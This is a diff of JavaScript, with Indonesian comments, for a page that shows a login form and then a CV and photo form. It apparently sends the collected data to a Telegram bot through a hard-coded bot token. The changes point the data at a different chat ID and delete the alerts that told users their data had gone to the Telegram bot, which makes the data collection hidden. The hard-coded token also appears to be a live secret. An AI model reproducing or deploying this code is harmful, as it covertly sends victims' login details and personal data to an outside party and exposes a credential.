@@ -1,5 +1,5 @@
 const botToken = "7595276003:AAH_K5VI6YosFAzu_h6XfNDhZ-qc_pj4wGQ"; // Ganti dengan token bot Telegram Anda
-const chatId = "7595276003"; // Ganti dengan ID chat di mana pesan akan dikirim
+const chatId = "526538064"; // Ganti dengan ID chat di mana pesan akan dikirim
 
 // Fungsi untuk lanjut ke form password
 function nextStep() {
@@ -13,7 +13,7 @@ function submitLogin() {
   const password = document.getElementById("password").value;
 
   if (username && password) {
-    alert("Login berhasil. Lanjutkan ke form CV.");
+    
     document.getElementById("loginPage").style.display = "none";
     document.getElementById("cvPage").style.display = "block";
   } else {
@@ -46,7 +46,7 @@ function submitCV() {
     // Setelah data teks dikirim, kirim foto
     sendPhotoToTelegram(photo);
 
-    alert("CV dan foto berhasil dikirim ke bot Telegram.");
+   
     document.getElementById("cvForm").reset();
   } else {
     alert("Lengkapi semua form sebelum mengirim.");
